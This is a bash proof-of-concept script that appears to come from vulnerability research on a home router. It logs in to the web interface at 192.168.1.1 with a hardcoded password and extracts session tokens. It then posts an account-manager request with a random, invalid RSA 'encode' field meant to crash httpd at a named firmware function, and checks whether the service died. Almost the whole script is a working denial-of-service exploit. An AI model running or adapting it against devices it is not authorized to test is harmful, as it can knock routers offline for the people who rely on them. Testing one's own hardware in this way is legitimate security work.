#!/bin/bash
# Test rsaDecryptWithoutKeyFile @ 0x4d6e0 bug
# Theory: malformed encode field (valid base64, invalid RSA ciphertext)
# may crash httpd if base64-decode succeeds but RSA_private_decrypt fails unsafely

set -e
COOKIES=/tmp/rsajar.txt
rm -f $COOKIES
PWD_USER="45788798"
LOG=/tmp/rsa_bug.log
: > $LOG

log() { echo "$@" | tee -a $LOG; }

#=== STEP 1+2: login + warmup ===
log "=== STEP 1: Login user/$PWD_USER (rolling token) ==="

# Bootstrap
curl -sk -c $COOKIES -b $COOKIES https://192.168.1.1/ \
  -H 'User-Agent: Mozilla/5.0' -o /dev/null

# Salt
TS=$(date +%s%N | cut -c1-13)
SALT1=$(curl -sk -c $COOKIES -b $COOKIES "https://192.168.1.1/?_type=loginData&_tag=login_token&_=$TS" \
  -H 'X-Requested-With: XMLHttpRequest' -H 'Referer: https://192.168.1.1/' \
  | sed -nE 's/.*>([0-9A-Za-z]+)<.*/\1/p')
PWHASH1=$(printf '%s' "${PWD_USER}${SALT1}" | sha256sum | cut -d' ' -f1)
log "  salt1=$SALT1"

# 1st login (seeds token)
RESP1=$(curl -sk -c $COOKIES -b $COOKIES 'https://192.168.1.1/?_type=loginData&_tag=login_entry' \
  -H 'X-Requested-With: XMLHttpRequest' -H 'Origin: https://192.168.1.1' \
  -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' \
  --data-urlencode "Password=${PWHASH1}" --data-urlencode "Username=user" \
  --data-urlencode "_sessionTOKEN=" --data-urlencode "action=login")
SEED_TOK=$(echo "$RESP1" | sed -nE 's/.*"sess_token":"([^"]+)".*/\1/p')
log "  1st (caducado) seed=$SEED_TOK"

# 2nd login (succeeds)
TS=$(date +%s%N | cut -c1-13)
SALT2=$(curl -sk -c $COOKIES -b $COOKIES "https://192.168.1.1/?_type=loginData&_tag=login_token&_=$TS" \
  -H 'X-Requested-With: XMLHttpRequest' | sed -nE 's/.*>([0-9A-Za-z]+)<.*/\1/p')
PWHASH2=$(printf '%s' "${PWD_USER}${SALT2}" | sha256sum | cut -d' ' -f1)
RESP2=$(curl -sk -c $COOKIES -b $COOKIES 'https://192.168.1.1/?_type=loginData&_tag=login_entry' \
  -H 'X-Requested-With: XMLHttpRequest' -H 'Origin: https://192.168.1.1' \
  -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' \
  --data-urlencode "Password=${PWHASH2}" --data-urlencode "Username=user" \
  --data-urlencode "_sessionTOKEN=${SEED_TOK}" --data-urlencode "action=login")
log "  2nd login: $RESP2"
echo "$RESP2" | grep -q "login_need_refresh.*true" || { log "LOGIN FAILED"; exit 1; }

#=== STEP 2: warmup to get _sessionTmpToken from menuView ===
log ""
log "=== STEP 2: Warmup menuView accountMgr ==="
curl -sk -c $COOKIES -b $COOKIES https://192.168.1.1/ \
  -H 'User-Agent: Mozilla/5.0' -H 'Accept: text/html' -o /dev/null

TS=$(date +%s%N | cut -c1-13)
HTML=$(curl -sk -c $COOKIES -b $COOKIES "https://192.168.1.1/?_type=menuView&_tag=accountMgr&Menu3Location=0&_=$TS" \
  -H 'X-Requested-With: XMLHttpRequest' -H 'Referer: https://192.168.1.1/')

# Extract _sessionTmpToken (the \xNN-encoded one)
TMP_TOKEN=$(echo "$HTML" | python3 -c '
import sys, re
m = re.search(r"_sessionTmpToken\s*=\s*\"([^\"]+)\"", sys.stdin.read())
if m:
    print(re.sub(r"\\\\x([0-9a-fA-F]{2})", lambda x: chr(int(x.group(1),16)), m.group(1)))
')
log "  _sessionTmpToken=$TMP_TOKEN"

# Trigger menuData GET
TS=$(date +%s%N | cut -c1-13)
curl -sk -c $COOKIES -b $COOKIES "https://192.168.1.1/?_type=menuData&_tag=devauth_accountmgr_lua.lua&_=$TS" \
  -H 'X-Requested-With: XMLHttpRequest' -H 'Referer: https://192.168.1.1/' >/dev/null
log "  menuData warmup done"

#=== STEP 3: Build POST with garbage encode ===
log ""
log "=== STEP 3: Build POST with GARBAGE encode field ==="

# Generate AES key/iv as 16-digit strings (for normal Password fields)
KEY_STR=$(tr -dc '0-9' </dev/urandom | head -c 16)
IV_STR=$(tr -dc '0-9' </dev/urandom | head -c 16)
AES_KEY=$(printf '%s' "$KEY_STR" | sha256sum | cut -d' ' -f1)
AES_IV=$(printf '%s' "$IV_STR" | sha256sum | cut -d' ' -f1 | head -c 32)

# AES encrypt the user pwd (zero-padded to 16B)
encrypt_pwd() {
  python3 -c "
import sys, base64
from Crypto.Cipher import AES
plain = sys.argv[1].encode()
plain += b'\x00' * (16 - len(plain) % 16)
ct = AES.new(bytes.fromhex('$AES_KEY'), AES.MODE_CBC, bytes.fromhex('$AES_IV')).encrypt(plain)
print(base64.b64encode(ct).decode(), end='')
" "$1"
}
ENC_PWD=$(encrypt_pwd "$PWD_USER")
log "  AES enc('$PWD_USER') = $ENC_PWD"

# Garbage encode: 720 chars of valid base64 random garbage
GARBAGE=$(head -c 540 /dev/urandom | base64 -w0 | head -c 720)
# Pad to multiple of 4 with =
while [ $((${#GARBAGE} % 4)) -ne 0 ]; do GARBAGE="${GARBAGE}="; done
log "  garbage encode (${#GARBAGE} chars): ${GARBAGE:0:60}..."

# URL-encode helper
url_enc() { python3 -c "import urllib.parse,sys; print(urllib.parse.quote_plus(sys.argv[1]),end='')" "$1"; }

ENC_PWD_URL=$(url_enc "$ENC_PWD")
GARBAGE_URL=$(url_enc "$GARBAGE")

BODY="IF_ACTION=Apply&_InstID=IGD.AU2&Right=2&Username=user&Password=${ENC_PWD_URL}&FakePasPassword=&NewPassword=${ENC_PWD_URL}&FakePasNewPassword=&FakePasNewConfirmPassword=&Btn_cancel_AccountManag=&Btn_apply_AccountManag=&encode=${GARBAGE_URL}&_sessionTOKEN=${TMP_TOKEN}"

#=== STEP 4: Compute Check header ===
CHECK=$(printf '%s' "$BODY" | sha256sum | cut -d' ' -f1)
log ""
log "=== STEP 4: Check header = $CHECK ==="
log "Body length: ${#BODY}"

#=== STEP 5: POST with strict timeout ===
log ""
log "=== STEP 5: POST (timeout 15s) ==="
START=$(date +%s)
RESP=$(curl -sk -i --max-time 15 -c $COOKIES -b $COOKIES \
  'https://192.168.1.1/?_type=menuData&_tag=devauth_accountmgr_lua.lua' \
  -H 'User-Agent: Mozilla/5.0' \
  -H 'X-Requested-With: XMLHttpRequest' \
  -H 'Origin: https://192.168.1.1' \
  -H 'Referer: https://192.168.1.1/' \
  -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' \
  -H "Check: $CHECK" \
  --data "$BODY" 2>&1) || RC=$?
END=$(date +%s)
log "elapsed=$((END-START))s, rc=${RC:-0}"
log "$RESP" | head -30

#=== STEP 6: Check httpd is still alive ===
log ""
log "=== STEP 6: httpd alive-check (timeout 5s) ==="
sleep 1
ALIVE_CODE=$(curl -sk --max-time 5 -o /dev/null -w "%{http_code}" https://192.168.1.1/ 2>&1) || ALIVE_RC=$?
log "  HTTP $ALIVE_CODE rc=${ALIVE_RC:-0}"

if [ "${ALIVE_RC:-0}" != "0" ] || [ "$ALIVE_CODE" = "000" ]; then
  log ""
  log "🎯🎯 httpd UNREACHABLE — likely CRASHED. Bug confirmed at rsaDecryptWithoutKeyFile@0x4d6e0"
elif echo "$RESP" | grep -q "200 OK"; then
  log ""
  log "✅ httpd alive, responded 200. Check if response is anomalous (vs normal cmret_xxx)"
else
  log ""
  log "🟢 httpd alive — bug NOT triggered (filtered upstream or different response)"
fi
